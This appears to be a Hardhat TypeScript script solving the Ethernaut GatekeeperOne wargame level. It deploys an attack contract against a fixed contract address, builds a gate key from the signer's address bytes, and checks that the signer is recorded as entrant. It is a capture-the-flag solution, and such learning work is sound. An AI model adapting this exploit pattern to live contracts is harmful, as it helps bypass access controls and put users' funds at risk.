import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import { GatekeeperOne, GatekeeperOne__factory, GateOneAttack, GateOneAttack__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0xd42aCC18396c08941bC8132Cf4218497D9604710';
  const gateInstance: GatekeeperOne = GatekeeperOne__factory.connect(deployedAddress, addr1);

  const attackInstance: GateOneAttack = await new GateOneAttack__factory(addr1).deploy(gateInstance.address);
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  //get 4 right caracter of address for uint16 == bytes2
  let hexKey = '0x000100020000' + addr1.address.substring(38);
  console.log(hexKey)
  await (await attackInstance.enterGate(hexKey, { gasLimit: 200000 })).wait(1);
  expect(await gateInstance.entrant()).to.be.equal(addr1.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
